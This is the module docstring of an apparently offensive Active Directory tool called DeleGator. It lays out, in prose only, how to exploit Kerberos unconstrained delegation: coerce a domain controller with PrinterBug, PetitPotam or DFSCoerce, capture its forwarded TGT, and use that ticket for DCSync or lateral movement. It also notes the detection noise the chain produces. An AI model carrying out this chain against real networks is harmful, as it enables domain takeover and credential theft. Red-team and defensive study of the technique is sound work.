"""
modules/unconstrained.py

Unconstrained Delegation exploitation module.

Attack chain:
  When a machine has TRUSTED_FOR_DELEGATION set, any user who authenticates
  to a service on that machine has their TGT forwarded to it automatically.
  An attacker with code execution or relay position on that machine can
  extract those forwarded TGTs and use them for further attacks.

  Without code execution on the target, the standard remote approach is
  coercion — forcing a privileged machine (typically a DC) to authenticate
  to the unconstrained delegation target using a protocol bug:

  Chain (coercion-based, remote):
    1. Confirm the unconstrained target is reachable and coercible
    2. Set up a TGT capture listener (krbrelayx or Responder)
    3. Trigger authentication from target machine to our listener
       using PrinterBug (SpoolSS), PetitPotam, DFSCoerce, etc.
    4. The authenticating machine's TGT is forwarded to the unconstrained
       target and captured by our listener
    5. Use the captured TGT for DCSync or lateral movement

  DeleGator's role in this chain:
    - Enumerate and verify unconstrained targets (via enumerate module)
    - Verify coercion potential (SpoolSS/PetitPotam port checks)
    - Guide the operator through the coercion setup with exact commands
    - Monitor for and capture TGTs written to a ccache by the listener
    - Validate and display captured tickets with usage instructions

  Note on scope:
    DeleGator does NOT implement coercion directly — coercion tools
    (PrinterBug, PetitPotam.py, DFSCoerce.py) are mature standalone tools
    and reimplementing them would add complexity without value. Instead
    this module generates the exact commands to run and monitors for
    the resulting ccache output.

OPSEC profile:
  Events generated:
    4768 — AS-REQ on the coerced machine (generated by the coerced DC,
            not by DeleGator — this is inherent to the technique)
    4769 — TGS request when using the captured TGT
    7045 — New service installed (if PrinterBug triggers service creation)
  Noise: HIGH
  Notes: Coercion generates significant event noise on the coerced machine.
         The SpoolSS/PrinterBug coercion is the noisiest. PetitPotam
         generates less host-level noise but is more commonly detected
         at the network layer by modern NDR products.
"""

